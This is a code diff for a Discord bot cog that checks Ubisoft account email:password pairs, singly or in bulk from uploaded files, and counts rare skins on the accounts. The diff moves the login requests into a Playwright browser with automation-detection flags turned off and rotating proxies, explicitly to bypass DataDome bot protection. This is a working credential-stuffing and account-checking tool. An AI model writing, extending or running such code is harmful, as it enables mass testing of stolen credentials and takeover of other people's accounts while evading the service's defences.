@@ -9,16 +9,15 @@ import random
 import io
 import os
 import json
-import tls_client
+from playwright.async_api import async_playwright
 
-# Official Ubisoft App ID
-UBI_APP_ID = "86263886-327a-4328-ac69-527f0d20a237"
+UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
 
 class Checker(commands.Cog):
     def __init__(self, bot):
         self.bot = bot
         self.proxies = self.load_proxies()
-
+        
         self.skin_cache = {}
         if os.path.exists("r6-skins-cache.json"):
             try:
@@ -47,64 +46,82 @@ class Checker(commands.Cog):
     @app_commands.describe(account="Format: email:password")
     async def check(self, interaction: discord.Interaction, account: str):
         await interaction.response.defer(ephemeral=True)
-
+        
         if ":" not in account:
             return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)
 
         email, password = account.split(":", 1)
-        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
-
-        await asyncio.sleep(random.uniform(1.0, 2.0))
-
-        headers = {
-            "Content-Type": "application/json",
-            "Ubi-AppId": UBI_APP_ID,
-            "Authorization": f"Basic {b64_auth}",
-            "Accept": "application/json",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Origin": "https://account.ubisoft.com",
-            "Referer": "https://account.ubisoft.com/",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-        }
-
-        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
-
+        
         proxy = random.choice(self.proxies) if self.proxies else None
+        
+        embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Input:** `{account}`\n\n⏳ *Booting real browser... (This takes 10-15 seconds)*")
+        await interaction.followup.send(embed=embed, ephemeral=True)
 
         try:
-            def do_request():
-                session = tls_client.Session(client_identifier="chrome_124")
+            async with async_playwright() as p:
+                # HEADFUL mode (headless=False) is required to bypass DataDome
+                launch_args = ["--disable-blink-features=AutomationControlled", "--no-sandbox"]
+                launch_kwargs = {"headless": False, "args": launch_args}
+                
                 if proxy:
-                    session.proxies = {"http": proxy, "https": proxy}
-                return session.post(
-                    "https://public-ubiservices.ubi.com/v3/profiles/sessions",
-                    headers=headers,
-                    json={"rememberMe": True},
-                    timeout_seconds=15
+                    if "@" in proxy:
+                        auth, server = proxy.split("@")
+                        protocol, auth = auth.split("//")
+                        user, pwd = auth.split(":")
+                        launch_kwargs["proxy"] = {"server": f"{protocol}://{server}", "username": user, "password": pwd}
+                    else:
+                        launch_kwargs["proxy"] = {"server": proxy}
+
+                browser = await p.chromium.launch(**launch_kwargs)
+                context = await browser.new_context(
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                 )
+                page = await context.new_page()
+                
+                # Navigate to a blank page first, then execute the API call via fetch inside the browser
+                await page.goto("https://account.ubisoft.com/")
+                await page.wait_for_timeout(3000) # Let DataDome settle
 
-            response = await asyncio.to_thread(do_request)
+                # Execute the login request inside the browser's context
+                b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
+                
+                js_code = f"""
+                async () => {{
+                    const res = await fetch("https://public-ubiservices.ubi.com/v3/profiles/sessions", {{
+                        method: "POST",
+                        headers: {{
+                            "Content-Type": "application/json",
+                            "Ubi-AppId": "{UBI_APP_ID}",
+                            "Authorization": "Basic {b64_auth}"
+                        }},
+                        body: JSON.stringify({{ rememberMe: true }})
+                    }});
+                    return res.status;
+                }}
+                """
+                
+                status_code = await page.evaluate(js_code)
+                await browser.close()
 
-            if response.status_code == 200:
-                embed.color = 0x57F287
-                embed.add_field(name="Status", value="✅ Valid")
-                await interaction.followup.send("✅ Account is valid.", ephemeral=True)
-            elif response.status_code == 401:
-                embed.color = 0xED4245
-                embed.add_field(name="Status", value="❌ Invalid / 2FA")
-                await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
-            elif response.status_code in (403, 429):
-                embed.color = 0xED4245
-                embed.add_field(name="Status", value="🚫 DataDome Blocked")
-                await interaction.followup.send("🚫 **Blocked:** DataDome blocked this IP.", ephemeral=True)
-            else:
-                embed.color = 0xFEE75C
-                embed.add_field(name="Status", value=f"⚠️ Error {response.status_code}")
-                await interaction.followup.send(f"⚠️ Error: HTTP {response.status_code}", ephemeral=True)
+                if status_code == 200:
+                    embed.color = 0x57F287
+                    embed.add_field(name="Status", value="✅ Valid")
+                    await interaction.followup.send("✅ Account is valid.", ephemeral=True)
+                elif status_code == 401:
+                    embed.color = 0xED4245
+                    embed.add_field(name="Status", value="❌ Invalid / 2FA")
+                    await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
+                elif status_code in (403, 429):
+                    embed.color = 0xED4245
+                    embed.add_field(name="Status", value="🚫 DataDome Blocked")
+                    await interaction.followup.send("🚫 **Blocked:** DataDome blocked this IP.", ephemeral=True)
+                else:
+                    embed.color = 0xFEE75C
+                    embed.add_field(name="Status", value=f"⚠️ Error {status_code}")
+                    await interaction.followup.send(f"⚠️ Error: HTTP {status_code}", ephemeral=True)
+
         except Exception as e:
-            embed.color = 0xED4245
-            embed.add_field(name="Status", value=f"⚠️ Network Error")
-            await interaction.followup.send(f"⚠️ Network error: {e}", ephemeral=True)
+            await interaction.followup.send(f"❌ Browser error: {e}", ephemeral=True)
 
         await self.log_to_channel(interaction, embed)
 
@@ -115,12 +132,12 @@ class Checker(commands.Cog):
             return
 
         await interaction.response.defer(ephemeral=True)
-
+        
         if ":" not in account:
             return await interaction.followup.send("❌ Invalid format. Use `email:password`.", ephemeral=True)
 
         email, password = account.split(":", 1)
-
+        
         try:
             from fetch_inventory import get_account_data
             result = await asyncio.to_thread(get_account_data, email, password)
@@ -129,38 +146,38 @@ class Checker(commands.Cog):
 
         if "error" in result:
             return await interaction.followup.send(f"❌ Error: {result['error']}", ephemeral=True)
-
+            
         username = result.get("username", "Unknown")
         profile_id = result.get("profile_id", "Unknown")
         inventory = result.get("inventory", {})
         items = inventory.get("items", [])
-
+        
         embed = discord.Embed(
             color=0x5865F2,
             title=f"👤 Account Preview: {username}",
             description=f"**Profile ID:** `{profile_id}`\n**Total Items:** `{len(items)}`"
         )
-
+        
         glaciers = 0
         black_ice = 0
-
+        
         if self.skin_cache:
             for item in items:
                 item_id = item.get('id')
                 if item_id in self.skin_cache:
                     cache_entry = self.skin_cache[item_id]
                     skin_name = cache_entry.get('name', '') if isinstance(cache_entry, dict) else str(cache_entry)
-
+                    
                     if "Glacier" in skin_name: glaciers += 1
                     if "Black Ice" in skin_name: black_ice += 1
-
+            
             embed.add_field(name="❄️ Rare Skins", value=f"Black Ice: `{black_ice}`\nGlacier: `{glaciers}`", inline=True)
         else:
             embed.add_field(name="❄️ Rare Skins", value="⚠️ Cache not loaded", inline=True)
-
+        
         embed.add_field(name="🎖️ Ranked", value="Rank data not fetched", inline=True)
         embed.set_footer(text="Use /check to verify login status")
-
+        
         await interaction.followup.send(embed=embed, ephemeral=True)
 
     @app_commands.command(name="checkfile", description="[Owner] Upload a .txt file to filter valid accounts.")
@@ -168,12 +185,12 @@ class Checker(commands.Cog):
     async def checkfile(self, interaction: discord.Interaction, file: discord.Attachment):
         if not await utils.owner_only(interaction):
             return
-
+            
         if not file.filename.endswith(".txt"):
             return await interaction.response.send_message("❌ Please upload a `.txt` file.", ephemeral=True)
-
+            
         await interaction.response.defer(ephemeral=True)
-
+        
         try:
             content = await file.read()
             lines = [line.strip() for line in content.decode('utf-8').splitlines() if line.strip()]
@@ -184,54 +201,63 @@ class Checker(commands.Cog):
         if total == 0:
             return await interaction.followup.send("❌ File is empty.", ephemeral=True)
 
-        await interaction.followup.send(f"⏳ Checking **{total}** accounts...", ephemeral=True)
+        await interaction.followup.send(f"⏳ Checking **{total}** accounts (Playwright mode is slow, this will take a while)...", ephemeral=True)
 
         valid_accounts = []
-        sem = asyncio.Semaphore(50)
-
+        sem = asyncio.Semaphore(5) # Keep concurrency low for Playwright so it doesn't crash
+        
         async def test_account(acc):
             async with sem:
                 creds = acc.split("|")[0].strip()
                 if ":" not in creds:
                     return
-
+                
                 email, password = creds.split(":", 1)
-                b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
-
-                headers = {
-                    "Content-Type": "application/json",
-                    "Ubi-AppId": UBI_APP_ID,
-                    "Authorization": f"Basic {b64_auth}",
-                    "Accept": "application/json",
-                    "Accept-Language": "en-US,en;q=0.9",
-                    "Origin": "https://account.ubisoft.com",
-                    "Referer": "https://account.ubisoft.com/",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
-                }
-
                 proxy = random.choice(self.proxies) if self.proxies else None
-
-                def do_req():
-                    session = tls_client.Session(client_identifier="chrome_124")
-                    if proxy:
-                        session.proxies = {"http": proxy, "https": proxy}
-                    return session.post(
-                        "https://public-ubiservices.ubi.com/v3/profiles/sessions",
-                        headers=headers,
-                        json={"rememberMe": True},
-                        timeout_seconds=15
-                    )
-
+                
                 try:
-                    response = await asyncio.to_thread(do_req)
-                    if response.status_code == 200:
-                        valid_accounts.append(acc)
-                    elif response.status_code == 401:
-                        pass
-                    elif response.status_code in (403, 429):
-                        valid_accounts.append(acc)
+                    async with async_playwright() as p:
+                        launch_args = ["--disable-blink-features=AutomationControlled", "--no-sandbox"]
+                        launch_kwargs = {"headless": False, "args": launch_args}
+                        
+                        if proxy:
+                            if "@" in proxy:
+                                auth, server = proxy.split("@")
+                                protocol, auth = auth.split("//")
+                                user, pwd = auth.split(":")
+                                launch_kwargs["proxy"] = {"server": f"{protocol}://{server}", "username": user, "password": pwd}
+                            else:
+                                launch_kwargs["proxy"] = {"server": proxy}
+
+                        browser = await p.chromium.launch(**launch_kwargs)
+                        context = await browser.new_context()
+                        page = await context.new_page()
+                        
+                        await page.goto("https://account.ubisoft.com/")
+                        await page.wait_for_timeout(2000) 
+
+                        b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
+                        js_code = f"""
+                        async () => {{
+                            const res = await fetch("https://public-ubiservices.ubi.com/v3/profiles/sessions", {{
+                                method: "POST",
+                                headers: {{
+                                    "Content-Type": "application/json",
+                                    "Ubi-AppId": "{UBI_APP_ID}",
+                                    "Authorization": "Basic {b64_auth}"
+                                }},
+                                body: JSON.stringify({{ rememberMe: true }})
+                            }});
+                            return res.status;
+                        }}
+                        """
+                        status_code = await page.evaluate(js_code)
+                        await browser.close()
+
+                        if status_code == 200:
+                            valid_accounts.append(acc)
                 except Exception:
-                    valid_accounts.append(acc)
+                    pass
 
         tasks = [test_account(acc) for acc in lines]
         await asyncio.gather(*tasks)
@@ -247,16 +273,16 @@ class Checker(commands.Cog):
             title="✅ File Checked",
             description=f"Found **{len(valid_accounts)}** valid accounts out of **{total}**."
         )
-
+        
         await interaction.followup.send(embed=embed, file=out_file, ephemeral=True)
 
     @app_commands.command(name="checkprelink", description="Submit a pre-linked console account (Xbox/PS).")
     @app_commands.describe(console="Xbox or PlayStation", details="Username or Email")
     async def checkprelink(self, interaction: discord.Interaction, console: str, details: str):
         await interaction.response.defer(ephemeral=True)
-
+        
         embed = discord.Embed(
-            color=0x5865F2,
+            color=0x5865F2, 
             title="🎮 Pre-Linked Check",
             description=f"**User:** {interaction.user.mention}\n**Console:** {console.capitalize()}\n**Details:** `{details}`"
         )
